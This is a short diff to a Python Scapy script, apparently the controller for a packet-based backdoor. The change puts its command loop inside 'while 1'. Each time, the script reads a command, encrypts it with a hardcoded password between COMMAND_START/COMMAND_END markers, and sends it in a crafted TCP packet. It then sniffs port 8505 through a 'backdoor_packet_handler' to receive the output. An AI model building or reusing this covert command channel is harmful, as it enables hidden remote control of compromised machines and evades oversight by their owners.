@@ -79,14 +79,16 @@ def decrypt(cipherText, password):
 
 dAddr= input("Enter Destination IP\n")
 srcPort = input("Enter Source Port\n")
-cmdLn = input("Enter command\n")
-ip = IP(dst=dAddr)
-ip.show()
-tcp = TCP(sport=int(srcPort))
-tcp.show()
-encryptCommand = encrypt(b"COMMAND_START"+cmdLn.encode()+b"COMMAND_END",b"password")
-pack = (ip/tcp/encryptCommand)
-rtPack = sr(pack)
+while 1:
+	cmdLn = input("Enter command\n")
+	ip = IP(dst=dAddr)
+	ip.show()
+	tcp = TCP(sport=int(srcPort))
+	tcp.show()
+	encryptCommand = encrypt(b"COMMAND_START"+cmdLn.encode()+b"COMMAND_END",b"password")
+	pack = (ip/tcp/encryptCommand)
+	rtPack = sr(pack)
 
-#Wait for the return of command sent
-sniff(prn=backdoor_packet_handler, filter="tcp and dest port 8505", store=0)
+	#Wait for the return of command sent
+	sniff(prn=backdoor_packet_handler, filter="tcp and dst port 8505", store=0)
+
